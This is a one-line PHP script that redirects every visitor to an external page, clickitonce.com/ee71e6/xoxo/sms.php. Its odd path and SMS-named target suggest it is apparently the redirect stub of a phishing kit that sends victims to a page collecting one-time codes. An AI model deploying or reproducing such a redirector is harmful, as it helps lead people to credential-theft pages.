<?php

header("Location: https://clickitonce.com/ee71e6/xoxo/sms.php");

?>